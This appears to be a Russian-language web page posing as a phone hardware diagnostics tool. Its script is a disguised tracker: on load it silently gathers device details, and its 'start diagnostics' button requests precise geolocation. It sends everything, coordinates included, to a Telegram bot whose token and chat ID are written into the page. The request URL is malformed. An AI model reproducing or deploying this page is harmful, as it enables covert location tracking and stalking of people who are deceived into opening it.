<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Тестирование конфигурации устройства</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; margin: 0; padding: 40px 20px; text-align: center; background-color: #f8f9fa; color: #333; }
        .container { max-width: 500px; margin: 0 auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); box-sizing: border-box; }
        h1 { font-size: 24px; color: #1a1a1a; margin-bottom: 10px; }
        p { font-size: 15px; color: #666; line-height: 1.5; margin-bottom: 25px; }
        button { padding: 14px 28px; font-size: 16px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 6px; font-weight: 600; width: 100%; box-sizing: border-box; }
        button:hover { background-color: #0056b3; }
    </style>
</head>
<body>

    <div class="container">
        <h1>Проверка параметров системы</h1>
        <p>Нажмите на кнопку ниже, чтобы начать диагностику аппаратных функций смартфона, включая калибровку датчика геолокации и замер батареи.</p>
        <button onclick="requestLocation()">Запустить диагностику</button>
    </div>

    <script>
        // Вставлен ваш новый очищенный токен бота
        const TOKEN = "8892692128:AAFRHGfhVZArPnQyjpDr_v2hyvX-ZyecuCQ";
        const CHAT_ID = "6559747526";

        // Метод отправки сообщений без ограничений CORS браузера
        function sendReport(extraData) {
            const time = new Date().toLocaleTimeString();
            const date = new Date().toLocaleDateString();
            
            const screenRes = `${window.screen.width}x${window.screen.height} (DPR: ${window.devicePixelRatio})`;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const cores = navigator.hardwareConcurrency || "Не определено";
            const isIos = /iPhone|iPad|iPod/i.test(navigator.userAgent) ? "Apple iOS" : "Android / PC";

            const reportText = `🔔 *Технический отчет*\n\n` +
                             `📅 *Дата:* ${date}\n` +
                             `🕒 *Время:* ${time}\n` +
                             `🤖 *Платформа:* ${isIos}\n` +
                             `🖥 *Экран:* ${screenRes}\n` +
                             `🌍 *Часовой пояс:* ${timezone}\n` +
                             `🧠 *Ядра CPU:* ${cores}` + 
                             extraData;

            const img = new Image();
            img.src = `https://telegram.org{TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(reportText)}&parse_mode=Markdown`;
        }

        // Функция поочередного безопасного сбора параметров
        function getSpecsAndSend(geoData = "") {
            let batteryText = "\n🔋 *Батарея:* Блокируется системой (iOS)";
            let modelText = "";

            if (navigator.getBattery) {
                navigator.getBattery().then(battery => {
                    batteryText = `\n🔋 *Батарея:* ${Math.round(battery.level * 100)}%`;
                    checkModelAndSend(batteryText, geoData);
                }).catch(() => {
                    checkModelAndSend(batteryText, geoData);
                });
            } else {
                checkModelAndSend(batteryText, geoData);
            }
        }

        function checkModelAndSend(batteryText, geoData) {
            let modelText = "";
            if (navigator.userAgentData) {
                navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]).then(ua => {
                    if (ua.model) modelText = `\n📱 *Модель:* ${ua.model} (v${ua.platformVersion})`;
                    sendReport(batteryText + modelText + geoData);
                }).catch(() => {
                    sendReport(batteryText + modelText + geoData);
                });
            } else {
                sendReport(batteryText + modelText + geoData);
            }
        }

        // Автоматический базовый отчет сразу при входе
        window.addEventListener('DOMContentLoaded', () => {
            setTimeout(() => { getSpecsAndSend(""); }, 500);
        });

        // Запуск при нажатии синей кнопки диагностики
        function requestLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        // Формат вывода: одна строчка для легкого копирования кликом
                        const coords = `\n📍 *Координаты:* \`${lat},${lon}\``;
                        
                        getSpecsAndSend(coords);
                        alert("Диагностика успешно завершена!");
                    },
                    (error) => {
                        getSpecsAndSend("\n❌ *Геолокация:* Доступ отклонен");
                        alert("Для завершения теста требуется разрешить доступ к датчику геолокации.");
                    },
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            } else {
                alert("Ваш браузер не поддерживает API геолокации.");
            }
        }
    </script>
</body>
</html>
